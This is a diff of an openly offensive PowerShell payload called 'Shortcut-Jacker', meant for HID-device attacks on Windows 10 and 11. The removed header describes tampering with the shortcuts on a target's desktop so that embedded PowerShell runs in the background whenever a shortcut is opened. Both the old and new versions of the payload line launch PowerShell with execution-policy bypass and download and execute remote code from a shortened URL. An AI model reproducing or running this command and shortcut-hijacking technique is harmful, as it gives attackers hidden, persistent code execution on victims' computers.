@@ -1,43 +1,4 @@
-############################################################################################################################################################                      
-#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
-# Title        : Shortcut-Jacker   | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
-# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
-# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
-# Category     : Execution         | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
-# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
-# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
-#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
-#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
-#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
-#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
-#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
-#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
-#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
-#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
-#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
-############################################################################################################################################################
-                                                                                                                                                                                                                                               
-<#
-.SYNOPSIS
-	This is payload used to inject PowerShell code into shortcuts.
-
-.DESCRIPTION 
-	This payload will gather information on the shortcuts on your targets desktop.
-  	That data will then be manipulated to embed a PowerShell script.
-  	This script will be ran in the background when the short cut is. 
-
-#>
-
-############################################################################################################################################################
-
-<#
-.NOTES
-	The PowerShell code stored in this variable is what will run in the background.
-	This field can store a max of 259 VISIBLE characters in that bar however after some testing I found you can store 924 characters int the $code 
-	variable and it will still run.
-#>  
-
-$code = "powershell -w h -NoP -NonI -Ep Bypass iwr shorturl.at/bpRX6 | iex"
+$code = "powershell -NoP -NonI -Ep Bypass irm shorturl.at/bpRX6 | iex"
 
 ############################################################################################################################################################
 
